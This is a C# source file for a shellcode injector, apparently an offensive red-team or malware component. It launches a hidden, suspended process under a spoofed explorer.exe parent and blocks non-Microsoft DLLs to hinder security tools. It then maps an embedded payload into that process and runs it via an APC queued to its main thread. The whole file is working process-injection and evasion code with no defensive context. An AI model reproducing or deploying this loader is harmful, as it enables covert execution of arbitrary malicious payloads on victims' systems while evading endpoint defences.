﻿using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using DInvoke.DynamicInvoke;

namespace Inject
{
    public class Entry
    {

        public static void Start()
        {
#if DEBUG
            Console.WriteLine("Running Inject.");
#endif

            try
            {
                var app = Properties.Resources.Host;
                //app = @"c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe";
                //app = @"c:\windows\system32\dllhost.exe";

                Thread.Sleep(1000);
#if DEBUG
                Console.WriteLine("Creating Process !");
                Console.WriteLine(app);
                Console.WriteLine("version 2.2");
#endif

                var startupInfoEx = new STARTUPINFOEX();

                _ = DInvoke.DynamicInvoke.Process.InitializeProcThreadAttributeList(ref startupInfoEx.lpAttributeList, 2);

                const long BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON = 0x100000000000;
                const int MITIGATION_POLICY = 0x20007;

                var blockDllPtr = Marshal.AllocHGlobal(IntPtr.Size);
                Marshal.WriteIntPtr(blockDllPtr, new IntPtr(BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON));

                _ = DInvoke.DynamicInvoke.Process.UpdateProcThreadAttribute(
                    ref startupInfoEx.lpAttributeList,
                    (IntPtr)MITIGATION_POLICY,
                    ref blockDllPtr);

                const int PARENT_PROCESS = 0x00020000;

                var ppidPtr = Marshal.AllocHGlobal(IntPtr.Size);
                var hParent = System.Diagnostics.Process.GetProcessesByName("explorer")[0].Handle;
                Marshal.WriteIntPtr(ppidPtr, hParent);

                _ = DInvoke.DynamicInvoke.Process.UpdateProcThreadAttribute(
                    ref startupInfoEx.lpAttributeList,
                    (IntPtr)PARENT_PROCESS,
                    ref ppidPtr);

                const uint CREATE_SUSPENDED = 0x00000004;
                const uint DETACHED_PROCESS = 0x00000008;
                const uint CREATE_NO_WINDOW = 0x08000000;
                const uint EXTENDED_STARTUP_INFO_PRESENT = 0x00080000;

                var result = DInvoke.DynamicInvoke.Process.CreateProcess(
                    app,
                    null,
                    CREATE_SUSPENDED | CREATE_NO_WINDOW | DETACHED_PROCESS | EXTENDED_STARTUP_INFO_PRESENT,
                    Environment.GetFolderPath(Environment.SpecialFolder.UserProfile),
                    ref startupInfoEx,
                    out var processInfo);

                var procId = processInfo.dwProcessId;
                if(procId == 0)
                {
                    throw new InvalidOperationException("Process was not started!");
                }

                byte[] shellcode = Properties.Resources.Payload;

                const uint GENERIC_ALL = 0x10000000;
                const uint PAGE_EXECUTE_READWRITE = 0x40;
                const uint SEC_COMMIT = 0x08000000;

                var hLocalSection = IntPtr.Zero;
                var maxSize = (ulong)shellcode.Length;

                var status = Native.NtCreateSection(
                    ref hLocalSection,
                    GENERIC_ALL,
                    IntPtr.Zero,
                    ref maxSize,
                    PAGE_EXECUTE_READWRITE,
                    SEC_COMMIT,
                    IntPtr.Zero);

                const uint PAGE_READWRITE = 0x04;

                var self = System.Diagnostics.Process.GetCurrentProcess();
                var hLocalBaseAddress = IntPtr.Zero;

                status = Native.NtMapViewOfSection(
                    hLocalSection,
                    self.Handle,
                    ref hLocalBaseAddress,
                    IntPtr.Zero,
                    IntPtr.Zero,
                    IntPtr.Zero,
                    ref maxSize,
                    2,
                    0,
                    PAGE_READWRITE);

                const uint PAGE_EXECUTE_READ = 0x20;

                var hRemoteBaseAddress = IntPtr.Zero;

                status = Native.NtMapViewOfSection(
                    hLocalSection,
                    processInfo.hProcess,
                    ref hRemoteBaseAddress,
                    IntPtr.Zero,
                    IntPtr.Zero,
                    IntPtr.Zero,
                    ref maxSize,
                    2,
                    0,
                    PAGE_EXECUTE_READ);

                Marshal.Copy(shellcode, 0, hLocalBaseAddress, shellcode.Length);

                var res = DInvoke.DynamicInvoke.Process.NtQueueApcThread(
                processInfo.hThread,
                hRemoteBaseAddress,
                IntPtr.Zero,
                IntPtr.Zero,
                IntPtr.Zero);

                _ = DInvoke.DynamicInvoke.Process.NtResumeThread(processInfo.hThread);
            }
            catch (Exception e)
            {
#if DEBUG
                Console.WriteLine(e.ToString());
#endif
            }
            finally
            {
                //Native.Kernel32.VirtualFreeEx(process.Handle, baseAddress, 0, Native.Kernel32.FreeType.Release);
            }


            Thread.Sleep(1000);

#if DEBUG
            Console.WriteLine("End Injects !");
#endif
        }
    }
}
